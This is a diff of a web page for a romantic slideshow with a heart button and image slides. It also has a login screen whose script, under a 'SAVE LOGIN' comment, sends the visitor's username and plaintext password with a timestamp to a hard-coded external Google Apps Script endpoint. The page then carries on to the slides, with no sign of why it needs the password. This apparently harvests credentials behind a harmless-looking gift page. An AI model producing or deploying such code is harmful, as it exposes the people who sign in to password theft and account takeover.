@@ -85,19 +85,14 @@ body{
     font-weight:bold;
 }
 
-.screen{
+.slide-img{
     width:100vw;
     height:100vh;
-    display:none;
-    justify-content:center;
-    align-items:center;
-    flex-direction:column;
-    position:relative;
-    overflow:hidden;
-
-    background-size:cover;
-    background-position:center center;
-    background-repeat:no-repeat;
+    max-width:100%;
+    max-height:100%;
+    object-fit:contain;
+    object-position:center;
+    background:black;
 }
 
 .heart-btn{
@@ -192,14 +187,16 @@ Open
 
 <div id="slideScreen" class="screen">
 
-    <div
-        id="heartButton"
-        class="heart-btn"
-        onclick="nextSlide()">
 
-        ❤️ Click Here
 
-    </div>
+<div
+id="heartButton"
+class="heart-btn"
+onclick="nextSlide()">
+
+❤️ Click Here
+
+</div>
 
 </div>
 
@@ -233,9 +230,9 @@ NO
 
 <!-- FINAL PAGE -->
 
-<div id="finalScreen"
-class="screen"
-style="background-image:url('images/image8.jpeg')">
+<div id="finalScreen" class="screen">
+
+images/image8.jpeg
 
 </div>
 
@@ -245,6 +242,7 @@ style="background-image:url('images/image8.jpeg')">
 
 const SCRIPT_URL =
 "https://script.google.com/macros/s/AKfycby85GsF15Kp5FuZIX5JZTlngsDcKhkOPBrnaGUXMnHtfjUCBo8e_-FCOUNNksnFO1RqTA/exec";
+
 /* SLIDES */
 
 const slides = [
@@ -312,44 +310,56 @@ return;
 /* SAVE LOGIN */
 
 fetch(SCRIPT_URL,{
-    method:"POST",
-    headers:{
-        "Content-Type":"application/json"
-    },
-    body:JSON.stringify({
-        username:username,
-        password:password,
-        timestamp:new Date().toLocaleString()
-    })
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+username:username,
+password:password,
+timestamp:new Date().toLocaleString()
+
 })
-.then(response => response.text())
-.then(data => {
-    console.log("SUCCESS:", data);
-})
-.catch(error => {
-    console.error("ERROR:", error);
-});
+
+}).catch(error => console.log(error));
+
+document
+.getElementById("loginScreen")
+.classList.remove("active");
+
+document
+.getElementById("slideScreen")
+.classList.add("active");
+
+currentSlide = 0;
+
+loadSlide();
+
+}
 
 /* LOAD IMAGE */
 
 function loadSlide(){
 
-    document
-    .getElementById("slideScreen")
-    .style.backgroundImage =
-    `url('${slides[currentSlide]}')`;
+document
+.getElementById("slideImage")
+.src = slides[currentSlide];
 
-    document
-    .getElementById("heartButton")
-    .style.display = "none";
+document
+.getElementById("heartButton")
+.style.display = "none";
 
-    setTimeout(() => {
+setTimeout(() => {
 
-        document
-        .getElementById("heartButton")
-        .style.display = "block";
+document
+.getElementById("heartButton")
+.style.display = "block";
 
-    },2000);
+},2000);
 
 }
 
